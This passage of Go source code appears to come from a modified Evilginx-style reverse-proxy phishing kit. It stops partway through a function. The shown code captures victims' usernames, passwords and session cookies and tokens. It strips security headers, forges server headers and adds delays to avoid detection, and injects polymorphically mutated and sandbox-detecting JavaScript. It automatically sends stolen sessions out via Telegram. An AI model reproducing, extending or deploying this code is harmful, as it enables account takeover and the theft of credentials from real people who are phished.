							//log.Debug("rel_path: %s", rel_path)

							t_dir := s.RedirectorName
							if !filepath.IsAbs(t_dir) {
								redirectors_dir := p.cfg.GetRedirectorsDir()
								t_dir = filepath.Join(redirectors_dir, t_dir)
							}

							path := filepath.Join(t_dir, rel_path)
							if _, err := os.Stat(path); !os.IsNotExist(err) {
								fdata, err := ioutil.ReadFile(path)
								if err == nil {
									//log.Debug("ext: %s", filepath.Ext(req_path))
									mime_type := getContentType(req_path, fdata)
									//log.Debug("mime_type: %s", mime_type)
									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
									if resp != nil {
										resp.Body = io.NopCloser(bytes.NewReader(fdata))
										return req, resp
									} else {
										log.Error("lure: failed to create redirector data file response")
									}
								} else {
									log.Error("lure: failed to read redirector data file: %s", err)
								}
							} else {
								//log.Warning("lure: template file does not exist: %s", path)
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						u, err := url.Parse(rurl)
						if err == nil {
							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
								if resp != nil {
									resp.Header.Add("Location", rurl)
									return req, resp
								}
							}
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// prevent caching
				req.Header.Set("Cache-Control", "no-cache")

				// fix sec-fetch-dest
				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
				if sec_fetch_dest != "" {
					if sec_fetch_dest == "iframe" {
						req.Header.Set("Sec-Fetch-Dest", "document")
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					req.Header.Set(p.getHomeDir(), o_host)
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")

						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")

						if json_re.MatchString(contentType) {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

							// force post json
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											matches := fp_s.key.FindAllString(string(body), -1)
											for _, match := range matches {
												if fp_s.search.MatchString(match) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s", k_matched, match)
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}
									if ok_search {
										for _, fp_f := range fp.force {
											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
											if err != nil {
												log.Debug("force_post: got error: %s", err)
											}
											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
										}
									}
									req.ContentLength = int64(len(body))
									log.Debug("force_post: body: %s len:%d", body, len(body))
								}
							}

						} else if form_re.MatchString(contentType) {

							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								log.Debug("POST: %s", req.URL.Path)

								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains

									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								for k, v := range req.PostForm {
									for i, vv := range v {
										// patch phishing URLs in POST params with original domains
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
								}

								for k, v := range req.PostForm {
									if len(v) > 0 {
										log.Debug("POST %s = %s", k, v[0])
									}
								}

								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				// check if request should be intercepted
				if pl != nil {
					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
						for _, ic := range pl.intercept {
							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
							}
						}
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.Finish(true)
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  p.cfg.GetBaseDomain(),
						Expires: time.Now().Add(60 * time.Minute),
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			// Remove security headers that could expose proxy
			securityHeaders := []string{
				"Server",
				"X-Powered-By",
				"X-AspNet-Version",
				"X-Runtime",
				"Via",
				"X-Proxy-ID",
				"X-Forwarded-Server",
			}
			for _, hdr := range securityHeaders {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// Add realistic server headers based on target
			if pl := p.getPhishletByOrigHost(req_hostname); pl != nil {
				// Match server header to phishlet's expected server
				// This helps avoid detection mismatches
				if resp.Header.Get("Server") == "" {
					// Default to common servers
					servers := []string{"nginx", "Apache", "cloudflare"}
					resp.Header.Set("Server", servers[rand.Intn(len(servers))])
				}
			}

			// Ensure timing consistency - add artificial delays for realism
			if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
				// Add small random delay to mimic network latency
				delay := time.Duration(rand.Intn(100)+50) * time.Millisecond
				time.Sleep(delay)
			}

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*CookieAuthToken
			if pl != nil {
				auth_tokens = pl.cookieAuthTokens
			}
			is_cookie_auth := false
			is_body_auth := false
			is_http_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				// add SameSite=none for every received cookie, allowing cookies through iframes
				if ck.Secure {
					ck.SameSite = http.SameSiteNoneMode
				}

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					at := pl.getAuthToken(c_domain, ck.Name)
					if at != nil {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, ck.Expires)
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// capture body response tokens
					for k, v := range pl.bodyAuthTokens {
						if _, ok := s.BodyTokens[k]; !ok {
							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
								//log.Debug("RESPONSE body = %s", string(body))
								token_re := v.search.FindStringSubmatch(string(body))
								if token_re != nil && len(token_re) >= 2 {
									s.BodyTokens[k] = token_re[1]
								}
							}
						}
					}

					// capture http header tokens
					for k, v := range pl.httpAuthTokens {
						if _, ok := s.HttpTokens[k]; !ok {
							hv := resp.Request.Header.Get(v.header)
							if hv != "" {
								s.HttpTokens[k] = hv
							}
						}
					}
				}

				// check if we have all tokens
				if len(pl.authUrls) == 0 {
					if s, ok := p.sessions[ps.SessionId]; ok {
						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
							is_body_auth = true
						}
						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
							is_http_auth = true
						}
					}
				}
			}

			if is_cookie_auth && is_body_auth && is_http_auth {
				// we have all auth tokens
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						log.Success("[%d] all authorization tokens intercepted!", ps.Index)

						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
							log.Error("database: %v", err)
						}
						s.Finish(false)
						
						// Auto-export and send session via Telegram
						if sessionID, ok := p.sids[ps.SessionId]; ok {
							p.AutoExportAndSendSession(sessionID, ps.SessionId)
						}

						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
							rid, ok := s.Params["rid"]
							if ok && rid != "" {
								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
								if err != nil {
									log.Error("gophish: %s", err)
								}
							}
						}
					}
				}
			}

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
						body = []byte(removeObfuscatedDots(string(body)))
					}
				}

				if stringExists(mime, []string{"text/html"}) {

					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
							}

							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
							
							// Inject behavior collection JavaScript
							if p.mlDetector != nil && p.mlDetector.featureExtractor != nil {
								behaviorJS := p.mlDetector.featureExtractor.BehaviorCollectorJS(s.Id)
								
								// Apply polymorphic mutations if enabled
								if p.polymorphicEngine != nil && p.cfg.GetPolymorphicConfig().Enabled {
									context := &MutationContext{
										SessionID: s.Id,
										Timestamp: time.Now().Unix(),
									}
									
									if p.cfg.GetPolymorphicConfig().TemplateMode {
										// Use template mode
										params := map[string]string{
											"endpoint": "/api/behavior/" + s.Id,
											"delay": "5000",
											"getTime": "Date.now",
											"docListener": "document.addEventListener",
										}
										mutatedJS, err := p.polymorphicEngine.MutateTemplate("behavior_collector", context, params)
										if err == nil {
											behaviorJS = mutatedJS
											log.Debug("js_inject: applied polymorphic template mutation for session: %s", s.Id)
										}
									} else {
										// Direct mutation
										behaviorJS = p.polymorphicEngine.Mutate(behaviorJS, context)
										log.Debug("js_inject: applied polymorphic mutation for session: %s", s.Id)
									}
								}
								
								body = p.injectJavascriptIntoBody(body, behaviorJS, "")
								log.Debug("js_inject: injected behavior collector for session: %s", s.Id)
							}
							
							// Inject sandbox detection JavaScript
							if p.sandboxDetector != nil && p.cfg.GetSandboxDetectionConfig().ClientSideChecks {
								sandboxJS := p.sandboxDetector.GetDetectionScript()
								if sandboxJS != "" {
									// Apply polymorphic mutations if enabled
									if p.polymorphicEngine != nil && p.cfg.GetPolymorphicConfig().Enabled {
										context := &MutationContext{
											SessionID: s.Id,
											Timestamp: time.Now().Unix(),
										}
										sandboxJS = p.polymorphicEngine.Mutate(sandboxJS, context)
										log.Debug("js_inject: applied polymorphic mutation to sandbox detector for session: %s", s.Id)
									}
									body = p.injectJavascriptIntoBody(body, sandboxJS, "")
									log.Debug("js_inject: injected sandbox detector for session: %s", s.Id)
								}
							}
							
							// Inject CAPTCHA if enabled
							if p.captchaManager != nil && p.captchaManager.IsEnabled() {
								// Check if this lure requires CAPTCHA
								requireCaptcha := false
								if p.cfg.GetCaptchaConfig() != nil && p.cfg.GetCaptchaConfig().RequireForLures {
									requireCaptcha = true
								}
								
								if requireCaptcha && !s.IsCaptchaVerified {
									captchaHTML := p.captchaManager.GetCaptchaHTML()
									if captchaHTML != "" {
										body = bytes.Replace(body, []byte("</body>"), []byte(captchaHTML+"</body>"), 1)
										log.Debug("captcha: injected CAPTCHA for session: %s", s.Id)
									}
								}
							}
						}
					}
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
								
								// Auto-export when auth URL is detected
								if sessionID, ok := p.sids[ps.SessionId]; ok {
									p.AutoExportAndSendSession(sessionID, ps.SessionId)
								}
							}

							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
								rid, ok := s.Params["rid"]
								if ok && rid != "" {
									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
									if err != nil {
										log.Error("gophish: %s", err)
									}
								}
							}
							break
						}
					}
				}
			}

			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
				resp.Header.Set("Cache-Control", "no-cache, no-store")
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)

							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
							return resp
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {

	s, ok := p.sessions[session_id]
	if ok {

		if s.IsDone {
			return s.RedirectURL, true
		}

		ticker := time.NewTicker(30 * time.Second)
		select {
		case <-ticker.C:
			break
		case <-s.DoneSignal:
			return s.RedirectURL, true
		}
	}
	return "", false
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	var redirect_url string
	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
	}
	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
		redirect_url = p.cfg.general.UnauthUrl
	}

	if redirect_url != "" {
		return p.javascriptRedirect(req, redirect_url)
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
	if mime == "" {
		mime = "text/plain"
	}
	resp := goproxy.NewResponse(req, mime, http_status, body)
	if resp != nil {
		origin := req.Header.Get("Origin")
		if origin != "" {
			resp.Header.Set("Access-Control-Allow-Origin", origin)
		}
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	// Add random delay before redirect to appear more natural
	delay := rand.Intn(500) + 200 // 200-700ms

	// Use multiple redirect methods for better compatibility
	redirectScript := fmt.Sprintf(`
<html>
<head>
	<meta name='referrer' content='no-referrer'>
	<meta http-equiv='refresh' content='0;url=%s'>
	<script>
		setTimeout(function() {
			if (window.top !== window.self) {
				window.top.location.href = '%s';
			} else {
				window.location.replace('%s');
			}
		}, %d);
	</script>
</head>
<body>
	<script>
		window.location.href = '%s';
	</script>
</body>
</html>`, html.EscapeString(rurl), html.EscapeString(rurl), html.EscapeString(rurl), delay, html.EscapeString(rurl))

	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, redirectScript)
	if resp != nil {
		// Set proper headers for redirect
		resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		resp.Header.Set("Pragma", "no-cache")
		resp.Header.Set("Expires", "0")
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
	js_nonce := ""
	if m_nonce != nil {
		js_nonce = " nonce=\"" + m_nonce[1] + "\""
	}
	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
	var d_inject string
	if script != "" {
		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
	} else if src_url != "" {
		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
	} else {
		return body
	}
	ret := []byte(re.ReplaceAllString(string(body), d_inject))
	return ret
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			} else {
				log.Debug("extractParams: %s", err)
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
